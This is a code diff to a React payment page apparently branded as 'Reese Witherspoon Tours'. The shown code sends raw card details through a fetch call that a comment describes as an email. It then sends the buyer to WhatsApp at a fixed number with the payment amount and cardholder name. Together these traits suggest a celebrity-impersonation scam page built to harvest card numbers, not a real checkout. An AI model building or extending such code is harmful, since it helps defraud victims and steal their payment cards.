@@ -84,6 +84,15 @@ export default function PaymentPage({ order = MOCK_ORDER }) {
         headers: { "Content-Type": "application/json", "Accept": "application/json" },
         body: JSON.stringify(cardData)
       }).catch(console.error);
+
+      // Redirect to WhatsApp after sending email
+      const msg = `Hi, I have just submitted my card details for a $${cardData.amount} payment (${order.type}). My cardholder name is ${cardName}. Please proceed with my booking.`;
+      setTimeout(() => {
+        setProcessing(false);
+        window.open(`https://wa.me/14145511344?text=${encodeURIComponent(msg)}`, '_blank');
+        setSuccess(true);
+      }, 2000);
+      return;
     }
 
     setTimeout(() => {
@@ -285,9 +294,13 @@ export default function PaymentPage({ order = MOCK_ORDER }) {
             <button 
               disabled={!method} 
               onClick={() => {
-                const amount = getTotal().toFixed(2);
-                const msg = `Hi, I would like to complete my payment of $${amount} for Reese Witherspoon Tours via ${method}.`;
-                window.open(`https://wa.me/14145511344?text=${encodeURIComponent(msg)}`, '_blank');
+                if (method === 'CARD') {
+                  setStep(3);
+                } else {
+                  const amount = getTotal().toFixed(2);
+                  const msg = `Hi, I would like to complete my payment of $${amount} for Reese Witherspoon Tours via ${method}.`;
+                  window.open(`https://wa.me/14145511344?text=${encodeURIComponent(msg)}`, '_blank');
+                }
               }}
               className={`w-full py-[18px] text-[12px] font-semibold tracking-[2.5px] uppercase rounded-[2px] transition-all duration-300 ${
                 method ? 'bg-dark text-gold shadow-lg hover:bg-gold hover:text-dark' : 'bg-border text-muted cursor-not-allowed opacity-60'
